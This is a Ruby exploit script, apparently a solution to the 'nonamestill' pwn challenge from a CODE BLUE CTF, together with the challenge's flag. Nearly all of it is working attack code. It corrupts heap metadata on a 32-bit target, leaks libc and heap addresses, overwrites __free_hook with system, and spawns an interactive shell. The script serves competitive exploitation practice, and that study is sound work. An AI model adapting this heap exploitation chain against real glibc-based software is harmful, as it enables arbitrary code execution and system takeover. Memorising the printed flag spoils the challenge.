#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo

host, port = 'nonamestill.tasks.ctf.codeblue.jp', 8369
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'nonamestill'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
# context.log_level = :debug

def pt; z.recvuntil('> ') end

def add(url, size: nil)
  pt
  z.puts 1
  z.puts size || (url.size + 1)
  z.write url
end

def del(idx)
  pt
  z.puts 4
  z.puts idx
end

def dec(idx)
  pt
  z.puts 2
  z.puts idx
end

head = 0x0804b088
long = flat(0x10111, head - 0xc, head - 8).ljust(0x100f0-4-4-1-24, "\x00")

add(long)
add('C' * (15))
add('B' * (15))
# add('C' * 15)
add('A' * 4 + "\x10\x01%") # 0x10110

add((p32(0x31) * (0x10010 / 4)).ljust(0x10030 - 4 - 4 - 1, "c"))

dec(1)

del(4)
add(long)
del(4)
del(1)

pt; z.puts 3
z.recvuntil('0: ')
libc = z.recvn(4).u32 - 0x1b0d60
log.info('libc @ ' + libc.hex)

add('C' * (0x18 - 4 - 4 - 1))
add("\x00" * 0x100c8 + flat(0x10071, head - 4, "\x00"))


pt; z.puts 3
z.recvuntil('2: ')
heap = z.recvn(4).u32 - 0x18
log.info('heap+0x1000 @ ' + heap.hex)

del(1)

del(0)
add(";sh".ljust(0x100c8, "\x00") + flat(0xffffff21, head - 4, "\x01"))

glibc = ELF.new('./libc.so.6')
glibc.address = libc
add("", size: glibc.symbols.__free_hook - heap - 0x10100 + 0x8 - 4294967296)

add(p32(glibc.symbols.system) * 2 + "\n", size: (heap - glibc.symbols.__free_hook) & 0xffffffff)

del(2)

z.interact

# CBCTF{This problem comes from DEFCON 2014 nonameyet. Did you notice that?}
